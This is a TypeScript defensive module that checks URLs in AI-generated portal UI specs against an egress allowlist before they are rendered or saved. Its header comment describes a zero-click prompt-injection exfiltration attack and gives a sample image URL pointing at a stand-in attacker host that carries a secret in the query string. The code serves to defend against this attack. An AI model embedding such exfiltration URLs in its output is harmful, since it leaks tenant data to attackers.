/**
 * Render-egress URL allowlist — the membrane that stops a generated PortalTab
 * spec from carrying an attacker-controlled URL the renderer would auto-fetch.
 *
 * The registry bounds a widget `url` to a syntactically-valid https string, but
 * "valid URL" is NOT "URL we are willing to fetch". A poisoned generation (the
 * spec composed under injected corpus/context) can embed
 * `https://evil.example/exfil?d=<secret>` in an image widget; the moment the
 * renderer requests it, tenant data leaks via the query string — the documented
 * zero-click exfiltration class (EchoLeak CVE-2025-32711, AgentFlayer; see
 * https://simonwillison.net/tags/exfiltration-attacks/). "Trusted domain" alone
 * is insufficient (open redirects, cloud blobs, Forms GETs), so this module
 * enforces: https-only, no userinfo, no IP-literal hosts, host on a
 * registrable-domain-suffix allowlist, and data: URIs only when explicitly
 * opted in (and never `data:text/html`).
 *
 * Pure + dependency-free: callers resolve the policy (env-driven allowlist at a
 * bootstrap seam) and pass it in, keeping the package free of `process.env`.
 *
 * @module @borjie/portal-genui/security/url-egress
 */

export interface UrlEgressPolicy {
  /**
   * Registrable-domain suffixes that are allowed, lowercase, no scheme. A host
   * matches when it equals an entry OR is a dotted subdomain of one
   * (`abc.supabase.co` matches `supabase.co`; `evilsupabase.co` does not).
   */
  readonly allowedHosts: ReadonlyArray<string>;
  /** Allow `data:` image URIs (inline, no network egress). Default false. */
  readonly allowDataUri?: boolean;
}

export interface UrlCheckResult {
  readonly ok: boolean;
  readonly reason?: string;
}

export interface DisallowedUrl {
  /** Dotted/indexed path to the offending value within the spec. */
  readonly path: string;
  readonly url: string;
  readonly reason: string;
}

/** Schemes we are ever willing to let the renderer fetch over the network. */
const ALLOWED_SCHEME = 'https:';

/** A value "looks like a URL" if it carries a scheme or is protocol-relative. */
const URL_SHAPED = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;

/** IPv4 dotted-quad or any colon-bearing host (IPv6) — rejected as host. */
const IPV4 = /^\d{1,3}(?:\.\d{1,3}){3}$/;

function isIpLiteral(host: string): boolean {
  if (IPV4.test(host)) return true;
  // new URL() strips the brackets from IPv6 literals; a bare colon in a
  // hostname only occurs for an IPv6 address.
  if (host.includes(':')) return true;
  return false;
}

function hostMatchesAllowlist(
  host: string,
  allowedHosts: ReadonlyArray<string>,
): boolean {
  return allowedHosts.some((entry) => {
    const e = entry.trim().toLowerCase();
    if (e.length === 0) return false;
    return host === e || host.endsWith(`.${e}`);
  });
}

/**
 * Decide whether a single URL string is safe for the renderer to fetch under
 * the given policy. Never throws.
 */
export function isAllowedMediaUrl(
  raw: string,
  policy: UrlEgressPolicy,
): UrlCheckResult {
  if (typeof raw !== 'string' || raw.trim().length === 0) {
    return { ok: false, reason: 'empty' };
  }
  const value = raw.trim();

  if (value.toLowerCase().startsWith('data:')) {
    if (!policy.allowDataUri) return { ok: false, reason: 'data-uri-not-allowed' };
    // Even when opted in, only non-executable media payloads are permitted.
    const isImage = /^data:image\/[a-z0-9.+-]+;/i.test(value);
    return isImage ? { ok: true } : { ok: false, reason: 'data-uri-not-image' };
  }

  // Protocol-relative `//host/...` has no scheme — treat as disallowed; the
  // active page scheme would apply, which we refuse to depend on.
  if (value.startsWith('//')) {
    return { ok: false, reason: 'protocol-relative' };
  }

  let url: URL;
  try {
    url = new URL(value);
  } catch {
    return { ok: false, reason: 'unparseable' };
  }

  if (url.protocol !== ALLOWED_SCHEME) {
    return { ok: false, reason: `scheme '${url.protocol}' not https` };
  }
  if (url.username.length > 0 || url.password.length > 0) {
    return { ok: false, reason: 'userinfo-present' };
  }

  const host = url.hostname.toLowerCase();
  if (host.length === 0) return { ok: false, reason: 'empty-host' };
  if (isIpLiteral(host)) return { ok: false, reason: 'ip-literal-host' };

  if (!hostMatchesAllowlist(host, policy.allowedHosts)) {
    return { ok: false, reason: `host '${host}' not in allowlist` };
  }
  return { ok: true };
}

/**
 * Deep-walk an arbitrary spec object and return every string value that LOOKS
 * like a URL but fails the egress policy. Walking every string (not just known
 * url-keyed props) is defense in depth: it catches a URL the model placed in an
 * unexpected field. Non-URL prose is ignored.
 */
export function findDisallowedUrls(
  spec: unknown,
  policy: UrlEgressPolicy,
): ReadonlyArray<DisallowedUrl> {
  const out: DisallowedUrl[] = [];

  const walk = (node: unknown, path: string): void => {
    if (typeof node === 'string') {
      if (URL_SHAPED.test(node.trim())) {
        const verdict = isAllowedMediaUrl(node, policy);
        if (!verdict.ok) {
          out.push({ path, url: node, reason: verdict.reason ?? 'disallowed' });
        }
      }
      return;
    }
    if (Array.isArray(node)) {
      node.forEach((item, i) => walk(item, `${path}[${i}]`));
      return;
    }
    if (node !== null && typeof node === 'object') {
      for (const [k, v] of Object.entries(node as Record<string, unknown>)) {
        walk(v, path.length === 0 ? k : `${path}.${k}`);
      }
    }
  };

  walk(spec, '');
  return Object.freeze(out);
}

/**
 * A sensible default media-host allowlist. Callers should extend this with the
 * tenant's Supabase project host + any first-party CDN at the bootstrap seam
 * rather than hardcoding deployment specifics here.
 */
export const DEFAULT_ALLOWED_MEDIA_HOSTS: ReadonlyArray<string> = Object.freeze([
  'supabase.co',
  'supabase.in',
  'borjie.app',
]);

/**
 * Thrown by the engine when a tab about to be persisted carries one or more
 * URLs that fail the egress policy. Carries the structured violation list so
 * the API layer can surface a precise 422 without leaking internals.
 */
export class PortalGenUiEgressError extends Error {
  public readonly code = 'EGRESS_URL_DISALLOWED' as const;
  public readonly violations: ReadonlyArray<DisallowedUrl>;

  public constructor(violations: ReadonlyArray<DisallowedUrl>) {
    super(
      `portal-genui: ${violations.length} disallowed URL(s) in generated spec — ` +
        violations.map((v) => `${v.path}=${v.url} (${v.reason})`).join('; '),
    );
    this.name = 'PortalGenUiEgressError';
    this.violations = Object.freeze([...violations]);
  }
}

/**
 * Assert every URL in a spec passes the policy; throws
 * `PortalGenUiEgressError` with the full violation list otherwise. No-op when
 * the spec is clean. Used by the engine persist/patch chokepoint.
 */
export function assertSpecUrlsAllowed(
  spec: unknown,
  policy: UrlEgressPolicy,
): void {
  const bad = findDisallowedUrls(spec, policy);
  if (bad.length > 0) throw new PortalGenUiEgressError(bad);
}
